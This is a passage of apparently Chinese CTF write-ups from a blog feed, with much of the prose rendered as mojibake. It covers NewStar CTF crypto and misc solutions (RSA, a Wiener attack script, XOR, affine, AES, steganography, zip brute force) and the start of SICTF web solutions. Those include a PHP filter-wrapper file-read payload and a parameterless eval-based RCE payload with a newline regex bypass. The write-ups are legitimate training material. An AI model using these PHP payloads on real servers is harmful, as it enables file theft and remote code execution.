class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="type">int</span> a[]=&#123;<span class="number">0x0A</span>,<span class="number">0x0C</span>,<span class="number">4</span>,<span class="number">0x1F</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="number">0xC</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="number">0x11</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="number">0x1A</span>,<span class="number">3</span>,<span class="number">0xD</span>,<span class="number">1</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">0x1F</span>,<span class="number">0x12</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">35</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">a[i]^=a[i+<span class="number">1</span>]^i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">36</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; (<span class="type">char</span>)a[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;Y0u_kn0w_what_1s_PE_File_F0rmat&#125;</span></span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p>æ ¹æ®é¢˜ç›®å¯ä»¥çŸ¥é“æ˜¯brainfuckç¼–ç ï¼Œéšä¾¿æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£ç å°±è¡Œäº†ã€‚</p><p><img src="/NewStar-CTF-Week1/c_1_1.png"></p><h2 id="Caesarâ€™s-Secert"><a href="#Caesarâ€™s-Secert" class="headerlink" title="Caesarâ€™s Secert"></a>Caesarâ€™s Secert</h2><p>å‡¯æ’’åŠ å¯†ï¼Œæ ¹æ®flagå¤´æ¨æ–­å‡ºkeyä¸º5ã€‚</p><p><img src="/NewStar-CTF-Week1/c_2_1.png"></p><h2 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h2><p>æ …æ å¯†ç ï¼Œæ ¹æ® { çš„ä½ç½®æ¨æ–­å‡ºkeyä¸º2 ã€‚</p><p><img src="/NewStar-CTF-Week1/c_3_1.png"></p><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="VigenÃ¨re"></a>VigenÃ¨re</h2><p>ç»´å‰å°¼äºšåŠ å¯†ï¼Œæ ¹æ®flagå¤´æ¨ç®—å‡º<code>kfck</code>ï¼Œå°è¯•<code>kfc</code>åå‘ç°æ­£ç¡®ã€‚</p><p><img src="/NewStar-CTF-Week1/c_4_1.png"></p><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>ç”¨yafuåˆ†è§£nï¼Œä¹‹åç›´æ¥å¥—è„šæœ¬ã€‚</p><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">P1 = <span class="number">2804303069</span></span><br><span class="line">P2 = <span class="number">2217990919</span></span><br><span class="line">P3 = <span class="number">2794985117</span></span><br><span class="line">P4 = <span class="number">3939901243</span></span><br><span class="line">P5 = <span class="number">2923072267</span></span><br><span class="line">P6 = <span class="number">2370292207</span></span><br><span class="line">P7 = <span class="number">2970591037</span></span><br><span class="line">P8 = <span class="number">2706073949</span></span><br><span class="line">P9 = <span class="number">2338725373</span></span><br><span class="line">P10 = <span class="number">2463878387</span></span><br><span class="line">P11 = <span class="number">3654864131</span></span><br><span class="line">P12 = <span class="number">4093178561</span></span><br><span class="line">P13 = <span class="number">3831680819</span></span><br><span class="line">P14 = <span class="number">4278428893</span></span><br><span class="line">P15 = <span class="number">3207148519</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi=(P1-<span class="number">1</span>)*(P2-<span class="number">1</span>)*(P3-<span class="number">1</span>)*(P4-<span class="number">1</span>)*(P5-<span class="number">1</span>)*(P6-<span class="number">1</span>)*(P7-<span class="number">1</span>)*(P8-<span class="number">1</span>)*(P9-<span class="number">1</span>)*(P10-<span class="number">1</span>)*(P11-<span class="number">1</span>)*(P12-<span class="number">1</span>)*(P13-<span class="number">1</span>)*(P14-<span class="number">1</span>)*(P15-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c=<span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;us4_s1ge_t0_cal_phI&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>è¶…å¤§çš„eï¼Œä½è§£å¯†æŒ‡æ•°æ”»å‡»ã€‚</p><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">d = getPrime(<span class="number">32</span>)</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(python2çš„è„šæœ¬)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: cp936 -*-</span><br><span class="line">import gmpy2</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># å±•å¼€ä¸ºè¿åˆ†æ•°</span><br><span class="line">def continuedFra(x, y):</span><br><span class="line">    cF = []</span><br><span class="line">    while y:</span><br><span class="line">        cF += [x / y]</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    return cF</span><br><span class="line"></span><br><span class="line">def Simplify(ctnf):</span><br><span class="line">    numerator = 0</span><br><span class="line">    denominator = 1</span><br><span class="line">    for x in ctnf[::-1]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    return (numerator, denominator)</span><br><span class="line"></span><br><span class="line"># è¿åˆ†æ•°åŒ–ç®€</span><br><span class="line">def calculateFrac(x, y):</span><br><span class="line">    cF = continuedFra(x, y)</span><br><span class="line">    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))</span><br><span class="line">    return cF</span><br><span class="line"></span><br><span class="line"># è§£éŸ¦è¾¾å®šç†</span><br><span class="line">def solve_pq(a, b, c):</span><br><span class="line">    par = gmpy2.isqrt(b * b - 4 * a * c)</span><br><span class="line">    return (-b + par) / (2 * a), (-b - par) / (2 * a)</span><br><span class="line"></span><br><span class="line">def wienerAttack(e, n):</span><br><span class="line">    for (d, k) in calculateFrac(e, n):</span><br><span class="line">        if k == 0: continue</span><br><span class="line">        if (e * d - 1) % k != 0: continue</span><br><span class="line"></span><br><span class="line">        phi = (e * d - 1) / k</span><br><span class="line">        p, q = solve_pq(1, n - phi + 1, n)</span><br><span class="line">        if p * q == n:</span><br><span class="line">            return abs(int(p)), abs(int(q))</span><br><span class="line">    print &#x27;not find!&#x27;</span><br><span class="line"></span><br><span class="line">time.clock()</span><br><span class="line">c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br><span class="line">e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br><span class="line">n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br><span class="line">p, q = wienerAttack(e, n)</span><br><span class="line"></span><br><span class="line">print &#x27;[+]Found!&#x27;</span><br><span class="line">print &#x27;  [-]p =&#x27;,p</span><br><span class="line">print &#x27;  [-]q =&#x27;,q</span><br><span class="line">print &#x27;  [-]n =&#x27;,p*q</span><br><span class="line">d = gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line">print &#x27;  [-]d =&#x27;, d</span><br><span class="line">print &#x27;  [-]m is:&#x27; + &#x27;&#123;:x&#125;&#x27;.format(pow(c,d,n)).decode(&#x27;hex&#x27;)</span><br><span class="line">print &#x27;\n[!]Timer:&#x27;, round(time.clock(),2), &#x27;s&#x27;</span><br><span class="line">print &#x27;[!]All Done!&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append(f ^ key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br></pre></td></tr></table></figure><p>å…ˆæ‹¿<code>0xe9</code>å’Œ<code>f</code>å¼‚æˆ–ï¼Œå¾—åˆ°keyä¸º143ï¼Œæœ€åç”¨ <a href="https://cyberchef.cn/">cyberchef</a> è§£å‡ºæ¥ã€‚</p><p><img src="/NewStar-CTF-Week1/c_5_1.png"></p><h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=</span><br><span class="line">part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=</span><br><span class="line">part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`</span><br></pre></td></tr></table></figure><p>part1 æ˜¯base64ï¼Œpart2æ˜¯base32ï¼Œpart3æ˜¯uuencodeã€‚</p><p>æœ€åå¾—åˆ°flagï¼š<code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line">modulus = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append((key[<span class="number">0</span>]*f + key[<span class="number">1</span>]) % modulus)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®flagå¤´ï¼Œå¯ä»¥åˆ—å‡ºä¸¤ä¸ªæ–¹ç¨‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1): (key[0]*&#x27;f&#x27;+key[1])%256=0xdd</span><br><span class="line">(2): (key[0]*&#x27;l&#x27;+key[1])%256=0x43</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰-ï¼ˆ1ï¼‰,å³å¯å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(key[0]*6)%256=-154</span><br></pre></td></tr></table></figure><p>å³å¯æ±‚å‡ºkey[0]ä¸º 17ï¼Œå°†key[0]ä»£å…¥ï¼Œæ±‚å‡ºkey[1]ä¸º23ã€‚</p><p>æœ€åå†™è„šæœ¬æ±‚å‡ºflagã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">256</span>-<span class="number">154</span>+<span class="number">256</span>*i)%<span class="number">6</span>==<span class="number">0</span>:</span><br><span class="line">        a=(<span class="number">256</span>-<span class="number">154</span>+<span class="number">256</span>*i)//<span class="number">6</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">b=<span class="number">0xdd</span>-(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>)*a)%<span class="number">256</span>       </span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">c=<span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(c):</span><br><span class="line">    c1=c[i]+c[i+<span class="number">1</span>]</span><br><span class="line">    c2=<span class="built_in">int</span>(c1,<span class="number">16</span>)</span><br><span class="line">    i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> (a*j + b) % <span class="number">256</span>==c2 :</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_ = pad(flag)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="number">1</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    enc_flag = aes.encrypt(flag_)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line"><span class="comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®æºç ï¼Œå¯ä»¥çŸ¥é“keyçš„å‰åä¸¤æ®µæ˜¯ä¸€æ ·çš„ï¼Œviå†å’Œaaå¼‚æˆ–åå–ååŠæ®µã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—å‡ºkeyå’Œviã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">aa= <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line">a=long_to_bytes(aa)</span><br><span class="line"></span><br><span class="line">key1 = a[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">iv=long_to_bytes(bytes_to_long(key1) ^ aa^<span class="number">1</span>)</span><br><span class="line">key=key1+key1</span><br><span class="line">iv=iv[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">c= <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag=aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;firsT_cry_Aes\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CyberChefâ€™s-Secret"><a href="#CyberChefâ€™s-Secret" class="headerlink" title="CyberChefâ€™s Secret"></a>CyberChefâ€™s Secret</h2><p>ç”¨CyberChefçš„megicæ–¹æ³•å³å¯å¾—åˆ°flagã€‚</p><p><img src="/NewStar-CTF-Week1/m_1_1.png"></p><h2 id="æœºå¯†å›¾ç‰‡"><a href="#æœºå¯†å›¾ç‰‡" class="headerlink" title="æœºå¯†å›¾ç‰‡"></a>æœºå¯†å›¾ç‰‡</h2><p>kaliä½¿ç”¨zstegå³å¯å¾—åˆ°flagã€‚</p><p><img src="/NewStar-CTF-Week1/m_2_1.png"></p><h2 id="æµé‡ï¼é²¨é±¼ï¼"><a href="#æµé‡ï¼é²¨é±¼ï¼" class="headerlink" title="æµé‡ï¼é²¨é±¼ï¼"></a>æµé‡ï¼é²¨é±¼ï¼</h2><p>Wiresharkæ‰“å¼€pacpæ–‡ä»¶ï¼Œå‘ç°æœ‰å¾ˆå¤šhttpæµé‡ ã€‚</p><p>è¿‡æ»¤å‡ºè¿”å›200çš„åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç±»ä¼¼base64çš„è¿”å›åŒ…ï¼ŒçŒœæµ‹æ˜¯flagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</span><br></pre></td></tr></table></figure><p><img src="/NewStar-CTF-Week1/m_3_1.png"></p><p>base64è§£ç 2æ¬¡å³å¯å¾—åˆ°flagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</span><br></pre></td></tr></table></figure><h2 id="ç©ºç™½æ ¼"><a href="#ç©ºç™½æ ¼" class="headerlink" title="ç©ºç™½æ ¼"></a>ç©ºç™½æ ¼</h2><p>æ˜¯<code>whitespace</code>ï¼Œç”¨ <a href="https://vii5ard.github.io/whitespace/">åœ¨çº¿ç½‘ç«™</a> å³å¯å¾—åˆ°flagã€‚</p><p><img src="/NewStar-CTF-Week1/m_4_1.png"></p><h2 id="éšç§˜çš„çœ¼ç›"><a href="#éšç§˜çš„çœ¼ç›" class="headerlink" title="éšç§˜çš„çœ¼ç›"></a>éšç§˜çš„çœ¼ç›</h2><p><code>silenteye</code>ï¼Œç”¨<code>silenteye</code>æ‰“å¼€ç‚¹å‡»decodeå³å¯å¾—åˆ°flagã€‚</p><p><img src="/NewStar-CTF-Week1/m_5_1.png"></p><h2 id="å‹ç¼©åŒ…ä»¬"><a href="#å‹ç¼©åŒ…ä»¬" class="headerlink" title="å‹ç¼©åŒ…ä»¬"></a>å‹ç¼©åŒ…ä»¬</h2><ol><li><p>æ–‡ä»¶ç”¨010æ‰“å¼€ï¼Œä¿®å¤æ–‡ä»¶å¤´å³å¯è§£å‹å‡º<code>flag.zip</code>ã€‚</p></li><li><p><code>flag.zip</code>ï¼Œå› ä¸ºè¢«ä¿®æ”¹äº†æ•°æ®åŒºï¼Œæ‰€ä»¥æ–‡ä»¶æŸåã€‚æ‰¾ä¸€ä¸ªæ­£ç¡®åŠ å¯†çš„zipåŒ…å¯¹ç€æ”¹å›æ¥å³å¯ã€‚</p></li><li><p>åœ¨å‹ç¼©åŒ…çš„æ³¨é‡ŠåŒºå‘ç°äº†base64ç¼–ç ï¼Œè§£ç åå¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I like six-digit numbers because they are very concise and easy to remember.</span><br></pre></td></tr></table></figure><p>å¯çŸ¥å‹ç¼©åŒ…å¯†ç æ˜¯6ä½æ•°å­—ã€‚</p></li><li><p>çˆ†ç ´å‹ç¼©åŒ…å¯†ç ï¼Œå¾—åˆ°ï¼Œå¯†ç ä¸º<code>232311</code>ï¼Œè§£å‹åå³å¯å¾—åˆ°flagä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
          <category> æ–°ç”Ÿèµ› </category>
          
          <category> ak </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF</title>
      <link href="/SICTF/"/>
      <url>/SICTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ç­¾åˆ°-Include"><a href="#ç­¾åˆ°-Include" class="headerlink" title="[ç­¾åˆ°]Include"></a>[ç­¾åˆ°]Include</h2><p>ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Œç”¨ä¼ªåè®®è¯»<code>/flag</code>å³å¯å¾—åˆ°flag.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?SICTF=php://filter/read=/resource=/flag</span><br></pre></td></tr></table></figure><p><img src="/SICTF/w_1_1.png"></p><h2 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h2><ol><li><p>å…ˆæ˜¯phpå˜é‡çš„ç‰¹æ€§ï¼Œä¼šå°†<code>[</code>, <code>+</code>, <code>.</code> ç­‰ç‰¹æ®Šå­—ç¬¦è§£ææˆ<code>_</code>  ã€‚</p></li><li><p>ç»•è¿‡preg_matchï¼Œå› ä¸ºæ˜¯å•è¡ŒåŒ¹é…ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¢è¡Œç»•è¿‡(<code>%0a</code>)ï¼Œ</p></li><li><p>æ¥ä¸‹æ¥æ˜¯æ— å‚æ•°RCEï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/9360">è¿™ä¸ªåšå®¢</a> ã€‚</p></li><li><p>åˆ©ç”¨<code>get_defined_vars()</code>ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get: ?k+e[y=123%0a&amp;b=phpinfo();</span><br><span class="line"></span><br><span class="line">post: command=eval(end(current(get_defined_vars())));</span><br></pre></td></tr></table></figure><p><img src="/SICTF/w_2_1.png"></p></li><li><p>æœ€ååœ¨æ ¹ç›®å½•æ‰¾åˆ°flagã€‚</p><p><img src="/SICTF/w_2_2.png"></p></li></ol><h2 id="pain"><a href="#pain" class="headerlink" 